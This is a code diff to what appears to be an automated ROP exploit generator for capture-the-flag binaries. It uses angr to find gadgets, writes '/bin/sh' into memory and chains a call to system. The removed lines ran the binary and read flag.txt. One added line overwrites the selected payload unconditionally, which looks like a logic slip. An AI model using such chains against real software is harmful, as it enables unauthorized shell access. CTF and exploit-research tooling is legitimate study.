@@ -18,7 +18,7 @@ class ROP:
         self.angr_proj = angr.Project(self.analysis.binary)
         self.angr_rop  = self.angr_proj.analyses.ROP()
         self.angr_rop.find_gadgets_single_threaded()
-    
+
     def write_binsh_to_mem(self):
         return self.angr_rop.write_to_mem(self.get_writeable_mem(), b"/bin/sh\0").payload_str()
 
@@ -29,12 +29,9 @@ class ROP:
         if dumb:
             chain += self.realign()
         chain += p64(self.analysis.elf.sym['system'])
-        io = process(self.analysis.binary)
-        io.sendline(chain)
-        io.sendline(b'cat flag.txt')
-        sleep(0.1)
-        io.recvuntil(b'flag{')
-        print ("flag{"+io.recvuntil(b'}').decode('utf-8'))
+        self.put_binsh=True
+        self.analysis.hbsh=True
+        return chain
     
 
 
@@ -53,6 +50,7 @@ class ROP:
             payload = self.ret2system()
         elif self.analysis.has_syscall():
             payload = self.ret2syscall()
+        payload = self.ropwrite()
 
         return payload
     
